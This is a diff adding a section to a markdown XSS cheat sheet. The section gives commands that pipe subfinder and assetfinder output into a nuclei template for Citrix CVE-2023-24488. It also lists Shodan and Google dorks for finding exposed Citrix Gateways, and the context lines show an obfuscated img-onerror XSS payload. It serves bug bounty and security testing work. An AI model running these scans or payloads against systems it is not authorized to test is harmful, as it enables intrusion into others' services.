@@ -359,6 +359,21 @@ GET /?q=xss     POST /q=xss
 <iMg src%3dN onerror%3dalert(0x000D98)>
 ```
 
+### Nuclei CVE-2023-24488 Citrix XSS - Easy Bug Bounty
+
+**Command**:\
+subfinder -d [target.com](http://target.com/) -silent | nuclei -t http/cves/2023/CVE-2023-24488.yaml\
+\
+assetfinder [target.com](http://target.com/) | nuclei -t http/cves/2023/CVE-2023-24488.yaml\
+\
+**Template**: [xss-nuclei-template-cve-2023-24488.yaml.md](xss-nuclei-template-cve-2023-24488.yaml.md "mention")\
+\
+**Shodan Dork**:\
+ssl:[target.com](http://target.com/) title:"Citrix gateway"\
+\
+**Dork**:\
+intitle:"Citrix Gateway" -site:[citrix.com](http://citrix.com/)
+
 ### Some awesome people on twitter
 
 * [@Dark\_Knight](https://twitter.com/\_Dark\_Knight\_)
